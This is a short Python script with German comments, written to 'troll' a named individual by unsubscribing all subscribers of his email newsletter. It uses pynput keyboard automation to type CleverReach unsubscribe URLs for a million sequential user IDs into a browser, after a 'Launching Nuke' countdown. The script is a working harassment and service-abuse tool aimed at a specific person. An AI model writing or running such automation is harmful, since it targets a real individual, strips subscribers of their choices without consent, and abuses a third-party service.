# soll diesen Dude Namens Gunnar Kessler trollen (alle Leute die sich bei seinem E-Mail Newsletter angemeldet haben abmelden
# Link https://1.seu2.cleverreach.com/show_unsubscribe_ready.php?lang=de  (die erste Zahl ist jeweils immer der Nutzer

from pynput.keyboard import Key, Controller
from time import sleep as s

keyboard = Controller()


def type(text):
    for char in text:
        keyboard.press(char)
        keyboard.release(char)
        #time.sleep(0.02)


def troll():
    i = 5
    print('Launching Nuke in : ')
    while i != 0:
        print(str(i))
        s(1)
        i -= 1

    for i in range(1000000):
        stuff = 'https://' + str(i) + '.seu2.cleverreach.com/show_unsubscribe_ready.php?lang=de'

        keyboard.tap(Key.f6)
        s(0.01)
        type(stuff)
        keyboard.tap(Key.enter)

        s(2)

troll()